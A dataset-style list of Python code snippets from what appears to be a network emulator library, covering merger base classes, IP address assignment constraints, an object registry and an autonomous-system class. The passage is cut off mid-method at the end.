  "class Mergeable(object):\n    \"\"\"!\n    @brief Mergeable base class\n    \"\"\"\n\n    def getTypeName(self) -> str:\n        \"\"\"!\n        @brief Get type name of the current object. \n\n        @returns type name.\n        \"\"\"\n        raise NotImplementedError(\"getTypeName not implemented.\")\n\n    def shouldMerge(self, other: Mergeable) -> bool:\n        \"\"\"!\n        @brief Test if two object should be merged, or treated as different\n        objects. This is called when merging two object with the same type.\n        emulator.\n\n        @param other the other object.\n\n        @returns true if should merge.\n        \"\"\"\n        raise NotImplementedError(\"equals not implemented.\")",
  "class Merger(object):\n    \"\"\"!\n    @brief Merger base class. \n\n    When merging, merger are invoked to do the merge.\n    \"\"\"\n\n    def getName(self) -> str:\n        \"\"\"!\n        @brief get name of the mergeable object.\n\n        @returns name.\n        \"\"\"\n        raise NotImplementedError(\"getName not implemented.\")\n\n    def getTargetType(self) -> str:\n        \"\"\"!\n        @brief Get the type name of objects that this merger can handle.\n\n        @returns type name.\n        \"\"\"\n        raise NotImplementedError(\"getTargetType not implemented.\")\n\n\n    def doMerge(self, objectA: Mergeable, objectB: Mergeable) -> Mergeable:\n        \"\"\"!\n        @brief Do merging.\n\n        @param objectA first object.\n        @param objectB second object.\n        @returns merged object.\n        \"\"\"\n        raise NotImplementedError(\"doMerge not implemented.\")\n\n    def _log(self, message):\n        print('== {}: {}'.format(self.getName(), message), file=stderr)",
  "def getTypeName(self) -> str:\n        \"\"\"!\n        @brief Get type name of the current object. \n\n        @returns type name.\n        \"\"\"\n        raise NotImplementedError(\"getTypeName not implemented.\")",
  "def shouldMerge(self, other: Mergeable) -> bool:\n        \"\"\"!\n        @brief Test if two object should be merged, or treated as different\n        objects. This is called when merging two object with the same type.\n        emulator.\n\n        @param other the other object.\n\n        @returns true if should merge.\n        \"\"\"\n        raise NotImplementedError(\"equals not implemented.\")",
  "def getName(self) -> str:\n        \"\"\"!\n        @brief get name of the mergeable object.\n\n        @returns name.\n        \"\"\"\n        raise NotImplementedError(\"getName not implemented.\")",
  "def getTargetType(self) -> str:\n        \"\"\"!\n        @brief Get the type name of objects that this merger can handle.\n\n        @returns type name.\n        \"\"\"\n        raise NotImplementedError(\"getTargetType not implemented.\")",
  "def doMerge(self, objectA: Mergeable, objectB: Mergeable) -> Mergeable:\n        \"\"\"!\n        @brief Do merging.\n\n        @param objectA first object.\n        @param objectB second object.\n        @returns merged object.\n        \"\"\"\n        raise NotImplementedError(\"doMerge not implemented.\")",
  "def _log(self, message):\n        print('== {}: {}'.format(self.getName(), message), file=stderr)",
  "class Assigner:\n    \"\"\"!\n    @brief Default address assigner.\n\n    This replaces python's generator, as that cannot be dumped.\n    \"\"\"\n\n    __current: int\n    __end: int\n    __step: int\n\n    def __init__(self, start: int, end: int, step: int):\n        \"\"\"!\n        @brief create a new assigner\n        \n        @param start start\n        @param end end\n        @param step step\n        \"\"\"\n        self.__current = start\n        self.__end = end\n        self.__step = step\n\n    def next(self) -> int:\n        \"\"\"!\n        @brief get next.\n\n        @returns next value.\n        \"\"\"\n        if self.__step > 0 and self.__current > self.__end:\n            assert False, 'out of range.'\n        if self.__step < 0 and self.__current < self.__end:\n            assert False, 'out of range.'\n        v = self.__current\n        self.__current += self.__step\n        return v",
  "class AddressAssignmentConstraint(Printable):\n    \"\"\"!\n    AddressAssignmentConstraint class.\n\n    This class defines how IP addresses should be assign to network interfaces.\n    Derive from this class to change the default behavior.\n    \"\"\"\n\n    __hostStart: int\n    __hostEnd: int\n    __routerStart: int\n    __routerEnd: int\n    __dhcpStart: int\n    __dhcpEnd: int\n    __hostStep: int\n    __routerStep: int\n    __ipRanges:Dict[str, Tuple[int, int]] = {}\n\n\n    def __init__(self, hostStart: int = 71, hostEnd: int = 99, hostStep: int = 1, dhcpStart: int = 101, dhcpEnd: int = 120, routerStart: int = 254, routerEnd: int = 200, routerStep: int = -1):\n        \"\"\"!\n        AddressAssignmentConstraint constructor.\n\n        @param hostStart start address offset of host nodes.\n        @param hostEnd end address offset of host nodes.\n        @param hostStep end step of host address.\n        @param dhcpStart start address offset of dhcp clients.\n        @param dhcpEnd end address offset of dhcp clients.\n        @param routerStart start address offset of router nodes.\n        @param routerEnd end address offset of router nodes.\n        @param routerStep end step of router address.\n        \"\"\"\n\n        self.__hostStart = hostStart\n        self.__hostEnd = hostEnd\n        self.__hostStep = hostStep\n\n        self.__dhcpStart = dhcpStart\n        self.__dhcpEnd = dhcpEnd\n\n        self.__routerStart = routerStart\n        self.__routerEnd = routerEnd\n        self.__routerStep = routerStep\n\n        self.__ipRanges['host'] = (hostStart, hostEnd) if hostStep > 0 else (hostEnd, hostStart)\n        self.__ipRanges['dhcp'] = (dhcpStart, dhcpEnd)\n        self.__ipRanges['router'] = (routerStart, routerEnd) if routerStep > 0 else (routerEnd, routerStart)\n        self.__checkIpConflict()\n\n\n    def setHostIpRange(self, hostStart:int , hostEnd: int, hostStep: int):\n        \"\"\"!\n        @brief Set IP Range for host nodes\n\n        @param hostStart start address offset of host nodes.\n        @param hostEnd end address offset of host nodes.\n        @param hostStep end step of host address.\n        \"\"\"\n        self.__hostStart = hostStart\n        self.__hostEnd = hostEnd\n        self.__hostStep = hostStep\n\n        self.__ipRanges['host'] = (hostStart, hostEnd) if hostStep > 0 else (hostEnd, hostStart)\n        self.__checkIpConflict()\n        \n    def setDhcpIpRange(self, dhcpStart:int, dhcpEnd: int):\n        \"\"\"!\n        @brief Set IP Range for DHCP Server to use\n        \n        @param dhcpStart start address offset of dhcp clients.\n        @param dhcpEnd end address offset of dhcp clients.\n        \"\"\"\n        self.__dhcpStart = dhcpStart\n        self.__dhcpEnd = dhcpEnd\n        self.__ipRanges['dhcp'] = (dhcpStart, dhcpEnd)\n        self.__checkIpConflict()\n\n\n    def setRouterIpRange(self, routerStart:int, routerEnd:int, routerStep: int):\n        \"\"\"!\n        @brief Set IP Range for router nodes\n\n        @param routerStart start address offset of router nodes.\n        @param routerEnd end address offset of router nodes.\n        @param routerStep end step of router address.\n        \"\"\"\n        self.__routerStart = routerStart\n        self.__routerEnd = routerEnd\n        self.__routerStep = routerStep\n\n        self.__ipRanges['router'] = (routerStart, routerEnd) if routerStep > 0 else (routerEnd, routerStart)\n        self.__checkIpConflict()\n        \n\n    def __checkIpConflict(self):\n        \"\"\"!\n        @brief Check conflict among IP Ranges\n        \"\"\"\n        ipRangesManager = self.__ipRanges\n        for type, ipRange in ipRangesManager.items():\n            assert ipRange[0] < ipRange[1], \"Set {}'s ip range again.\".format(type)\n            \n        while len(ipRangesManager) > 1:\n            minStartType = min(ipRangesManager.items(), key=lambda x: x[1][0])[0]\n            minStartEnd = ipRangesManager.pop(minStartType)[1]\n            nextMinStartType = min(ipRangesManager.items(), key=lambda x: x[1][0])[0]\n            nextMinStart = ipRangesManager[nextMinStartType][0]\n            assert minStartEnd < nextMinStart, \"The ip ranges of {} and {} conflict\".format(minStartType, nextMinStartType)\n\n    def getDhcpIpRange(self) -> list:\n        \"\"\"!\n        @brief Get IP range for DHCP server to use.\n        \"\"\"\n        return [str(self.__dhcpStart), str(self.__dhcpEnd)]\n        \n    def getOffsetAssigner(self, type: NodeRole) -> Assigner:\n        \"\"\"!\n        @brief Get IP offset assigner for a type of node.\n\n        @todo Handle pure-internal routers.\n\n        @param type type of the node.\n        @returns An int assigner that generates IP address offset.\n        @throws ValueError if try to get assigner of IX interface.\n        \"\"\"\n\n        if type == NodeRole.Host: return Assigner(self.__hostStart, self.__hostEnd, self.__hostStep)\n        if type == NodeRole.Router: return Assigner(self.__routerStart, self.__routerEnd, self.__routerStep)\n\n        raise ValueError(\"IX IP assignment must done with mapIxAddress().\")\n\n    def mapIxAddress(self, asn: int) -> int:\n        \"\"\"!\n        @brief Map ASN to IP address in IX peering LAN.\n\n        @param asn ASN of IX participant.\n        @returns offset.\n        @throws AssertionError if can't map ASN to IP address.\n        \"\"\"\n        assert asn >= 2 and asn <= 254, \"can't map ASN {} to IX address.\".format(asn)\n        return asn\n\n    def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'AddressAssignmentConstraint: Default Constraint\\n'\n\n        return out",
  "def __init__(self, start: int, end: int, step: int):\n        \"\"\"!\n        @brief create a new assigner\n        \n        @param start start\n        @param end end\n        @param step step\n        \"\"\"\n        self.__current = start\n        self.__end = end\n        self.__step = step",
  "def next(self) -> int:\n        \"\"\"!\n        @brief get next.\n\n        @returns next value.\n        \"\"\"\n        if self.__step > 0 and self.__current > self.__end:\n            assert False, 'out of range.'\n        if self.__step < 0 and self.__current < self.__end:\n            assert False, 'out of range.'\n        v = self.__current\n        self.__current += self.__step\n        return v",
  "def __init__(self, hostStart: int = 71, hostEnd: int = 99, hostStep: int = 1, dhcpStart: int = 101, dhcpEnd: int = 120, routerStart: int = 254, routerEnd: int = 200, routerStep: int = -1):\n        \"\"\"!\n        AddressAssignmentConstraint constructor.\n\n        @param hostStart start address offset of host nodes.\n        @param hostEnd end address offset of host nodes.\n        @param hostStep end step of host address.\n        @param dhcpStart start address offset of dhcp clients.\n        @param dhcpEnd end address offset of dhcp clients.\n        @param routerStart start address offset of router nodes.\n        @param routerEnd end address offset of router nodes.\n        @param routerStep end step of router address.\n        \"\"\"\n\n        self.__hostStart = hostStart\n        self.__hostEnd = hostEnd\n        self.__hostStep = hostStep\n\n        self.__dhcpStart = dhcpStart\n        self.__dhcpEnd = dhcpEnd\n\n        self.__routerStart = routerStart\n        self.__routerEnd = routerEnd\n        self.__routerStep = routerStep\n\n        self.__ipRanges['host'] = (hostStart, hostEnd) if hostStep > 0 else (hostEnd, hostStart)\n        self.__ipRanges['dhcp'] = (dhcpStart, dhcpEnd)\n        self.__ipRanges['router'] = (routerStart, routerEnd) if routerStep > 0 else (routerEnd, routerStart)\n        self.__checkIpConflict()",
  "def setHostIpRange(self, hostStart:int , hostEnd: int, hostStep: int):\n        \"\"\"!\n        @brief Set IP Range for host nodes\n\n        @param hostStart start address offset of host nodes.\n        @param hostEnd end address offset of host nodes.\n        @param hostStep end step of host address.\n        \"\"\"\n        self.__hostStart = hostStart\n        self.__hostEnd = hostEnd\n        self.__hostStep = hostStep\n\n        self.__ipRanges['host'] = (hostStart, hostEnd) if hostStep > 0 else (hostEnd, hostStart)\n        self.__checkIpConflict()",
  "def setDhcpIpRange(self, dhcpStart:int, dhcpEnd: int):\n        \"\"\"!\n        @brief Set IP Range for DHCP Server to use\n        \n        @param dhcpStart start address offset of dhcp clients.\n        @param dhcpEnd end address offset of dhcp clients.\n        \"\"\"\n        self.__dhcpStart = dhcpStart\n        self.__dhcpEnd = dhcpEnd\n        self.__ipRanges['dhcp'] = (dhcpStart, dhcpEnd)\n        self.__checkIpConflict()",
  "def setRouterIpRange(self, routerStart:int, routerEnd:int, routerStep: int):\n        \"\"\"!\n        @brief Set IP Range for router nodes\n\n        @param routerStart start address offset of router nodes.\n        @param routerEnd end address offset of router nodes.\n        @param routerStep end step of router address.\n        \"\"\"\n        self.__routerStart = routerStart\n        self.__routerEnd = routerEnd\n        self.__routerStep = routerStep\n\n        self.__ipRanges['router'] = (routerStart, routerEnd) if routerStep > 0 else (routerEnd, routerStart)\n        self.__checkIpConflict()",
  "def __checkIpConflict(self):\n        \"\"\"!\n        @brief Check conflict among IP Ranges\n        \"\"\"\n        ipRangesManager = self.__ipRanges\n        for type, ipRange in ipRangesManager.items():\n            assert ipRange[0] < ipRange[1], \"Set {}'s ip range again.\".format(type)\n            \n        while len(ipRangesManager) > 1:\n            minStartType = min(ipRangesManager.items(), key=lambda x: x[1][0])[0]\n            minStartEnd = ipRangesManager.pop(minStartType)[1]\n            nextMinStartType = min(ipRangesManager.items(), key=lambda x: x[1][0])[0]\n            nextMinStart = ipRangesManager[nextMinStartType][0]\n            assert minStartEnd < nextMinStart, \"The ip ranges of {} and {} conflict\".format(minStartType, nextMinStartType)",
  "def getDhcpIpRange(self) -> list:\n        \"\"\"!\n        @brief Get IP range for DHCP server to use.\n        \"\"\"\n        return [str(self.__dhcpStart), str(self.__dhcpEnd)]",
  "def getOffsetAssigner(self, type: NodeRole) -> Assigner:\n        \"\"\"!\n        @brief Get IP offset assigner for a type of node.\n\n        @todo Handle pure-internal routers.\n\n        @param type type of the node.\n        @returns An int assigner that generates IP address offset.\n        @throws ValueError if try to get assigner of IX interface.\n        \"\"\"\n\n        if type == NodeRole.Host: return Assigner(self.__hostStart, self.__hostEnd, self.__hostStep)\n        if type == NodeRole.Router: return Assigner(self.__routerStart, self.__routerEnd, self.__routerStep)\n\n        raise ValueError(\"IX IP assignment must done with mapIxAddress().\")",
  "def mapIxAddress(self, asn: int) -> int:\n        \"\"\"!\n        @brief Map ASN to IP address in IX peering LAN.\n\n        @param asn ASN of IX participant.\n        @returns offset.\n        @throws AssertionError if can't map ASN to IP address.\n        \"\"\"\n        assert asn >= 2 and asn <= 254, \"can't map ASN {} to IX address.\".format(asn)\n        return asn",
  "def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'AddressAssignmentConstraint: Default Constraint\\n'\n\n        return out",
  "class BaseSystem(Enum):\n    \"\"\"!\n    @brief Base System Enum.\n    \"\"\"\n\n    # These are code names for the systems that can be used as \n    # the base for the node. During the Docker compilation time, these\n    # names will be used to find the corresponding docker images. \n    UBUNTU_20_04        = 'ubuntu20.04'\n    SEEDEMU_BASE        = 'seedemu-base'\n    SEEDEMU_ROUTER      = 'seedemu-router'\n    SEEDEMU_ETHEREUM    = 'seedemu-ethereum'\n    DEFAULT             = SEEDEMU_BASE\n\n    # The relationship of the images: B is a subset of A means that \n    # A is built on top of A and has \n    SUBSET: Dict[str, list(str)] = {\n                UBUNTU_20_04: [],\n                SEEDEMU_BASE: [UBUNTU_20_04],\n                SEEDEMU_ROUTER: [UBUNTU_20_04, SEEDEMU_BASE],\n                SEEDEMU_ETHEREUM: [UBUNTU_20_04, SEEDEMU_BASE],\n            }\n    \n    @staticmethod \n    def doesAContainB(A: BaseSystem, B: BaseSystem):  \n        \"\"\"!\n        @brief Check if B is subset of A.\n\n        @param A : BaseSystem\n        @param B : BaseSystem\n\n        @returns True if B is a subset of A.\n        \"\"\"\n        if B.value in BaseSystem.SUBSET.value[A.value]:\n            return True\n        else:\n            return False",
  "def doesAContainB(A: BaseSystem, B: BaseSystem):  \n        \"\"\"!\n        @brief Check if B is subset of A.\n\n        @param A : BaseSystem\n        @param B : BaseSystem\n\n        @returns True if B is a subset of A.\n        \"\"\"\n        if B.value in BaseSystem.SUBSET.value[A.value]:\n            return True\n        else:\n            return False",
  "class Registrable(object):\n    \"\"\"!\n    @brief The Registerable base class.\n\n    Base class for all Registrable objects.\n    \"\"\"\n    _rscope: str\n    _rtype: str\n    _rname: str\n    _attrs: Dict[str, object]\n\n    def __init__(self):\n        \"\"\"!\n        @brief Registerable class constructor.\n        \"\"\"\n        super().__init__()\n        self.__scope = 'undefined'\n        self._rtype = 'undefined'\n        self._rname = 'undefined'\n\n    def doRegister(self, scope: str, type: str, name: str):\n        \"\"\"!\n        @brief Handle registration.\n\n        @param scope scope.\n        @param type type.\n        @param name name.\n        \"\"\"\n        self._rscope = scope\n        self._rtype = type\n        self._rname = name\n        self._attrs = {}\n    \n    def getRegistryInfo(self) -> Tuple[str, str, str]:\n        \"\"\"!\n        @brief Get registry info\n\n        @returns Tuple of scope, type and name\n        \"\"\"\n        return (self._rscope, self._rtype, self._rname)\n\n    def getAttribute(self, name: str, default: object = None) -> object:\n        \"\"\"!\n        @brief Get an attribute.\n\n        @param name name of attribute.\n        @param default value to set and return if name not exist.\n\n        @returns value, or None if not exist.\n        \"\"\"\n        if name not in self._attrs:\n            if default != None:\n                self.setAttribute(name, default)\n                return self._attrs[name]\n            return None\n        return self._attrs[name]\n\n    def setAttribute(self, name: str, value: object):\n        \"\"\"!\n        @brief Set an attribute.\n\n        @param name name of attribute.\n        @param value value of attribute.\n        \"\"\"\n        self._attrs[name] = value\n\n    def hasAttribute(self, name: str) -> bool:\n        \"\"\"!\n        @brief Check if an attribute exists.\n\n        @param name name of attribute.\n        \n        @returns True if exist, False otherwise.\n        \"\"\"\n        return name in self._attrs",
  "class Registry(Printable):\n    \"\"\"!\n    @brief The Registry class.\n\n    Registry is the global container for all objects in the emulator.\n    \"\"\"\n\n    __objects: Dict[Tuple[str, str, str], Registrable]\n\n    def __init__(self):\n        \"\"\"!\n        @brief create a new Registry.\n        \"\"\"\n        self.__objects = {}\n\n    def register(self, scope: str, type: str, name: str, obj: Registrable) -> Registrable:\n        \"\"\"!\n        @brief Register an object.\n\n        @param scope scope of the object (e.g., asn).\n        @param type type of the object (e.g., net/node)\n        @param name name of the object.\n        @param obj target object.\n        @returns registered object\n        @throws AssertionError if name exists.\n        \"\"\"\n        assert (scope, type, name) not in self.__objects, 'object with name {} already exist.'.format(name)\n        obj.doRegister(scope, type, name)\n        self.__objects[(scope, type, name)] = obj\n        return self.__objects[(scope, type, name)]\n\n    def get(self, scope: str, type: str, name: str) -> Registrable:\n        \"\"\"!\n        @brief Retrieve an object with name.\n\n        @param scope scope of the object (e.g., asn).\n        @param type type of the object (e.g., net/node)\n        @param name name of the object.\n        @throws AssertionError if name does not exist.\n        @returns object.\n        \"\"\"\n        assert (scope, type, name) in self.__objects, 'object with name {} does not exist.'.format(name)\n        return self.__objects[(scope, type, name)]\n\n    def has(self, scope: str, type: str, name: str) -> bool:\n        \"\"\"!\n        @brief Test if an object exist.\n\n        @param scope scope of the object (e.g., asn).\n        @param type type of the object (e.g., net/node)\n        @param name name of the object.\n        @returns True if exist, False otherwise.\n        \"\"\"\n        return (scope, type, name) in self.__objects\n\n    def getByType(self, scope: str, type: str) -> List[Registrable]:\n        \"\"\"!\n        @brief Retrieve objects with type.\n\n        @param scope scope of the object (e.g., asn).\n        @param type type of the object (e.g., net/node)\n        @returns objects.\n        \"\"\"\n        rslt: List[Registrable] = []\n\n        for key, obj in self.__objects.items():\n            (s, t, _) = key\n            if s == scope and t == type: rslt.append(obj)\n\n        return rslt\n\n    def getAll(self) -> Dict[Tuple[str, str, str], Registrable]:\n        \"\"\"!\n        @brief Get all objects in the Global Registry.\n\n        @returns dictionary, where keys in tuple (scope, type, name) and value\n        is object\n        \"\"\"\n        return self.__objects\n\n    def getByScope(self, scope: str) -> List[Registrable]:\n        \"\"\"!\n        @brief Retrieve objects with scope.\n\n        @param scope scope of the object (e.g., asn).\n        @returns objects.\n        \"\"\"\n        rslt: List[Registrable] = []\n\n        for key, obj in self.__objects.items():\n            (s, _, _) = key\n            if s == scope: rslt.append(obj)\n\n        return rslt\n    \n    def print(self, indent: int):\n        out = (' ' * indent) + 'Registry:\\n'\n        indent += 4\n        for keys, val in self.__objects.items():\n            [scope, type, name] = keys\n            out += (' ' * indent) + 'Object {}/{}/{}:\\n'.format(scope, type, name)\n            out += val.print(indent + 4)\n\n        return out",
  "class ScopedRegistry(Registry):\n    \"\"\"!\n    @brief Scoped Registry class.\n\n    Scoped wrapper for Registry class.\n    \"\"\"\n\n    __reg: Registry\n    __scope: str\n\n    def __init__(self, scope: str, parent: Registry):\n        \"\"\"!\n        @brief Scoped Registry ctor.\n\n        @param scope scope to bind to.\n        @param parent parent Registry object.\n        \"\"\"\n        self.__scope = scope\n        self.__reg = parent\n\n    def register(self, type: str, name: str, obj: Registrable) -> Registrable:\n        \"\"\"!\n        @brief Register an object.\n\n        @param type type of the object (e.g., net/node)\n        @param name name of the object.\n        @param obj target object.\n        @returns registered object\n        @throws AssertionError if name exists.\n        \"\"\"\n        return self.__reg.register(self.__scope, type, name, obj)\n\n    def get(self, type: str, name: str) -> object:\n        \"\"\"!\n        @brief Retrieve an object with name.\n\n        @param type type of the object (e.g., net/node)\n        @param name name of the object.\n        @throws AssertionError if name does not exist.\n        @returns object.\n        \"\"\"\n        return self.__reg.get(self.__scope, type, name)\n\n    def has(self, type: str, name: str) -> bool:\n        \"\"\"!\n        @brief Test if an object exist.\n\n        @param type type of the object (e.g., net/node)\n        @param name name of the object.\n        @returns True if exist, False otherwise.\n        \"\"\"\n        return self.__reg.has(self.__scope, type, name)\n\n    def getByType(self, type: str) -> List[Registrable]:\n        \"\"\"!\n        @brief Retrieve objects with type.\n\n        @param type type of the object (e.g., net/node)\n        @returns objects.\n        \"\"\"\n        return self.__reg.getByType(self.__scope, type)",
  "def __init__(self):\n        \"\"\"!\n        @brief Registerable class constructor.\n        \"\"\"\n        super().__init__()\n        self.__scope = 'undefined'\n        self._rtype = 'undefined'\n        self._rname = 'undefined'",
  "def doRegister(self, scope: str, type: str, name: str):\n        \"\"\"!\n        @brief Handle registration.\n\n        @param scope scope.\n        @param type type.\n        @param name name.\n        \"\"\"\n        self._rscope = scope\n        self._rtype = type\n        self._rname = name\n        self._attrs = {}",
  "def getRegistryInfo(self) -> Tuple[str, str, str]:\n        \"\"\"!\n        @brief Get registry info\n\n        @returns Tuple of scope, type and name\n        \"\"\"\n        return (self._rscope, self._rtype, self._rname)",
  "def getAttribute(self, name: str, default: object = None) -> object:\n        \"\"\"!\n        @brief Get an attribute.\n\n        @param name name of attribute.\n        @param default value to set and return if name not exist.\n\n        @returns value, or None if not exist.\n        \"\"\"\n        if name not in self._attrs:\n            if default != None:\n                self.setAttribute(name, default)\n                return self._attrs[name]\n            return None\n        return self._attrs[name]",
  "def setAttribute(self, name: str, value: object):\n        \"\"\"!\n        @brief Set an attribute.\n\n        @param name name of attribute.\n        @param value value of attribute.\n        \"\"\"\n        self._attrs[name] = value",
  "def hasAttribute(self, name: str) -> bool:\n        \"\"\"!\n        @brief Check if an attribute exists.\n\n        @param name name of attribute.\n        \n        @returns True if exist, False otherwise.\n        \"\"\"\n        return name in self._attrs",
  "def __init__(self):\n        \"\"\"!\n        @brief create a new Registry.\n        \"\"\"\n        self.__objects = {}",
  "def register(self, scope: str, type: str, name: str, obj: Registrable) -> Registrable:\n        \"\"\"!\n        @brief Register an object.\n\n        @param scope scope of the object (e.g., asn).\n        @param type type of the object (e.g., net/node)\n        @param name name of the object.\n        @param obj target object.\n        @returns registered object\n        @throws AssertionError if name exists.\n        \"\"\"\n        assert (scope, type, name) not in self.__objects, 'object with name {} already exist.'.format(name)\n        obj.doRegister(scope, type, name)\n        self.__objects[(scope, type, name)] = obj\n        return self.__objects[(scope, type, name)]",
  "def get(self, scope: str, type: str, name: str) -> Registrable:\n        \"\"\"!\n        @brief Retrieve an object with name.\n\n        @param scope scope of the object (e.g., asn).\n        @param type type of the object (e.g., net/node)\n        @param name name of the object.\n        @throws AssertionError if name does not exist.\n        @returns object.\n        \"\"\"\n        assert (scope, type, name) in self.__objects, 'object with name {} does not exist.'.format(name)\n        return self.__objects[(scope, type, name)]",
  "def has(self, scope: str, type: str, name: str) -> bool:\n        \"\"\"!\n        @brief Test if an object exist.\n\n        @param scope scope of the object (e.g., asn).\n        @param type type of the object (e.g., net/node)\n        @param name name of the object.\n        @returns True if exist, False otherwise.\n        \"\"\"\n        return (scope, type, name) in self.__objects",
  "def getByType(self, scope: str, type: str) -> List[Registrable]:\n        \"\"\"!\n        @brief Retrieve objects with type.\n\n        @param scope scope of the object (e.g., asn).\n        @param type type of the object (e.g., net/node)\n        @returns objects.\n        \"\"\"\n        rslt: List[Registrable] = []\n\n        for key, obj in self.__objects.items():\n            (s, t, _) = key\n            if s == scope and t == type: rslt.append(obj)\n\n        return rslt",
  "def getAll(self) -> Dict[Tuple[str, str, str], Registrable]:\n        \"\"\"!\n        @brief Get all objects in the Global Registry.\n\n        @returns dictionary, where keys in tuple (scope, type, name) and value\n        is object\n        \"\"\"\n        return self.__objects",
  "def getByScope(self, scope: str) -> List[Registrable]:\n        \"\"\"!\n        @brief Retrieve objects with scope.\n\n        @param scope scope of the object (e.g., asn).\n        @returns objects.\n        \"\"\"\n        rslt: List[Registrable] = []\n\n        for key, obj in self.__objects.items():\n            (s, _, _) = key\n            if s == scope: rslt.append(obj)\n\n        return rslt",
  "def print(self, indent: int):\n        out = (' ' * indent) + 'Registry:\\n'\n        indent += 4\n        for keys, val in self.__objects.items():\n            [scope, type, name] = keys\n            out += (' ' * indent) + 'Object {}/{}/{}:\\n'.format(scope, type, name)\n            out += val.print(indent + 4)\n\n        return out",
  "def __init__(self, scope: str, parent: Registry):\n        \"\"\"!\n        @brief Scoped Registry ctor.\n\n        @param scope scope to bind to.\n        @param parent parent Registry object.\n        \"\"\"\n        self.__scope = scope\n        self.__reg = parent",
  "def register(self, type: str, name: str, obj: Registrable) -> Registrable:\n        \"\"\"!\n        @brief Register an object.\n\n        @param type type of the object (e.g., net/node)\n        @param name name of the object.\n        @param obj target object.\n        @returns registered object\n        @throws AssertionError if name exists.\n        \"\"\"\n        return self.__reg.register(self.__scope, type, name, obj)",
  "def get(self, type: str, name: str) -> object:\n        \"\"\"!\n        @brief Retrieve an object with name.\n\n        @param type type of the object (e.g., net/node)\n        @param name name of the object.\n        @throws AssertionError if name does not exist.\n        @returns object.\n        \"\"\"\n        return self.__reg.get(self.__scope, type, name)",
  "def has(self, type: str, name: str) -> bool:\n        \"\"\"!\n        @brief Test if an object exist.\n\n        @param type type of the object (e.g., net/node)\n        @param name name of the object.\n        @returns True if exist, False otherwise.\n        \"\"\"\n        return self.__reg.has(self.__scope, type, name)",
  "def getByType(self, type: str) -> List[Registrable]:\n        \"\"\"!\n        @brief Retrieve objects with type.\n\n        @param type type of the object (e.g., net/node)\n        @returns objects.\n        \"\"\"\n        return self.__reg.getByType(self.__scope, type)",
  "class AutonomousSystem(Printable, Graphable, Configurable):\n    \"\"\"!\n    @brief AutonomousSystem class. \n\n    This class represents an autonomous system.\n    \"\"\"\n\n    __asn: int\n    __subnets: List[IPv4Network]\n    __routers: Dict[str, Node]\n    __hosts: Dict[str, Node]\n    __nets: Dict[str, Network]\n\n    __name_servers: List[str]\n\n    def __init__(self, asn: int, subnetTemplate: str = \"10.{}.0.0/16\"):\n        \"\"\"!\n        @brief AutonomousSystem constructor.\n\n        @param asn ASN for this system.\n        @param subnetTemplate (optional) template for assigning subnet.\n        \"\"\"\n        super().__init__()\n        self.__hosts = {}\n        self.__routers = {}\n        self.__nets = {}\n        self.__asn = asn\n        self.__subnets = None if asn > 255 else list(IPv4Network(subnetTemplate.format(asn)).subnets(new_prefix = 24))\n        self.__name_servers = []\n\n    def setNameServers(self, servers: List[str]) -> AutonomousSystem:\n        \"\"\"!\n        @brief set recursive name servers to use on nodes in this AS. Overwrites\n        emulator-level settings.\n\n        @param servers list of IP addresses of recursive name servers. Set to\n        empty list to use default (i.e., do not change, or use emulator-level\n        settings)\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__name_servers = servers\n\n        return self\n\n    def getNameServers(self) -> List[str]:\n        \"\"\"!\n        @brief get configured recursive name servers for nodes in this AS.\n\n        @returns list of IP addresses of recursive name servers\n        \"\"\"\n        return self.__name_servers\n\n    def getPrefixList(self) -> List[str]:\n        \"\"\"!\n        @brief Helper tool, get real-world prefix list for the current ans by\n        RIPE RIS.\n\n        @throw AssertionError if API failed.\n        \"\"\"\n\n        rslt = requests.get(RIS_PREFIXLIST_URL, {\n            'resource': self.__asn\n        })\n\n        assert rslt.status_code == 200, 'RIPEstat API returned non-200'\n        \n        json = rslt.json()\n        assert json['status'] == 'ok', 'RIPEstat API returned not-OK'\n \n        return [p['prefix'] for p in json['data']['prefixes'] if ':' not in p['prefix']]\n\n    def registerNodes(self, emulator: Emulator):\n        \"\"\"!\n        @brief register all nodes in the as in the emulation.\n\n        Note: this is to be invoked by the renderer.\n\n        @param emulator emulator to register nodes in.\n        \"\"\"\n\n        reg = emulator.getRegistry()\n            \n        for val in list(self.__nets.values()):\n            net: Network = val\n            if net.getRemoteAccessProvider() != None:\n                rap = net.getRemoteAccessProvider()\n\n                brNode = self.createRouter('br-{}'.format(net.getName()))\n                brNet = emulator.getServiceNetwork()\n\n                rap.configureRemoteAccess(emulator, net, brNode, brNet)\n\n        for router in list(self.__routers.values()):\n            if issubclass(router.__class__, RealWorldRouter):\n                router.joinNetwork(emulator.getServiceNetwork().getName())\n\n        for (key, val) in self.__nets.items(): reg.register(str(self.__asn), 'net', key, val)\n        for (key, val) in self.__hosts.items(): reg.register(str(self.__asn), 'hnode', key, val)\n        for (key, val) in self.__routers.items(): reg.register(str(self.__asn), 'rnode', key, val)\n\n    def configure(self, emulator: Emulator):\n        \"\"\"!\n        @brief configure all nodes in the as in the emulation.\n\n        Note: this is to be invoked by the renderer.\n\n        @param emulator emulator to configure nodes in.\n        \"\"\"\n        for host in self.__hosts.values():\n            if len(host.getNameServers()) == 0:\n                host.setNameServers(self.__name_servers)\n            \n            host.configure(emulator)\n        \n        for router in self.__routers.values():\n            if len(router.getNameServers()) == 0:\n                router.setNameServers(self.__name_servers)\n\n            router.configure(emulator)\n\n    def getAsn(self) -> int:\n        \"\"\"!\n        @brief Get ASN.\n\n        @returns asn.\n        \"\"\"\n        return self.__asn\n    \n    def createNetwork(self, name: str, prefix: str = \"auto\", direct: bool = True, aac: AddressAssignmentConstraint = None) -> Network:\n        \"\"\"!\n        @brief Create a new network.\n\n        @param name name of the new network.\n        @param prefix optional. Network prefix of this network. If not set, a\n        /24 subnet of \"10.{asn}.{id}.0/24\" will be used, where asn is ASN of\n        this AS, and id is a self-incremental value starts from 0.\n        @param direct optional. direct flag of the network. A direct network\n        will be added to RIB of routing daemons. Default to true.\n        @param aac optional. AddressAssignmentConstraint to use. Default to\n        None.\n\n        @returns Network.\n        @throws StopIteration if subnet exhausted.\n        \"\"\"\n        assert prefix != \"auto\" or self.__asn <= 255, \"can't use auto: asn > 255\"\n\n        network = IPv4Network(prefix) if prefix != \"auto\" else self.__subnets.pop(0)\n        assert name not in self.__nets, 'Network with name {} already exist.'.format(name)\n        self.__nets[name] = Network(name, 